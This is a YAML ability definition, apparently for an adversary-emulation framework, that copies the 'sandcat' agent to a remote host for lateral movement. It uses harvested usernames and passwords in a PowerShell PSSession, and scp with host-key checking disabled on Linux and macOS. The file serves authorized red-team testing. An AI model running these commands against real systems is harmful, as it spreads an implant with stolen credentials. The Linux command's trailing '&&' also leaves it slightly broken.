---

- id: 4908fdc4-74fc-4d7c-8935-26d11ad26a8d
  name: Copy 54ndc47
  description: Copy 54ndc47 to remote host
  tactic: lateral-movement
  technique:
    attack_id: T1105
    name: Remote File Copy
  platforms:
    windows:
      psh:
        command: |
          $username = "#{host.user.name}";
          $password = "#{host.user.password}";
          $secstr = New-Object -TypeName System.Security.SecureString;
          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
          $File = [System.IO.File]::ReadAllBytes("sandcat.go-windows");
          $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
          Copy-Item -Path sandcat.go-windows -Destination 'C:\Users\Public\' -ToSession $session
        payload: sandcat.go
    darwin:
      sh:
        command: |
          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~
        cleanup: |
          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
        payload: sandcat.go
    linux:
      sh:
        command: |
          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&
        cleanup: |
          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
        payload: sandcat.go